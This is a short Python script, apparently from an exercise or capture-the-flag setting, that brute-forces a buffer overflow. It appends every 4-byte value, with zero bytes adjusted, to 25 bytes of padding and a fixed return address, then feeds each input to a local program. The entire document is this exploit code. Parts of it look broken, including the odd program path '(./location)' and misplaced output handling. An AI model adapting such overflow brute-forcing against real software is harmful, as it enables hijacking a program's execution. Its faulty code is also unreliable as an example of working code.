# fusser of buffer overflow
import os
import subprocess
import sys

d_base = bytearray(b"AAAAAAAAAAAAAAAAAAAAAAAAA") 
test = bytearray(b"\x63\x92\x04\x08") 
for i in range (2**32): # 2^32 = 4294967296
    d_vary = bytearray(i.to_bytes(4, byteorder='little')) # 4 bytes 
    #print(d_vary)
    for index, value in enumerate(d_vary):
        if value == 0:
            d_vary[index] += 1
    data_in = d_base + d_vary + test
    #print(bytes(data_in))
    out = subprocess.check_output(['(./location)', bytes(data_in)]) # run the program
print (out)
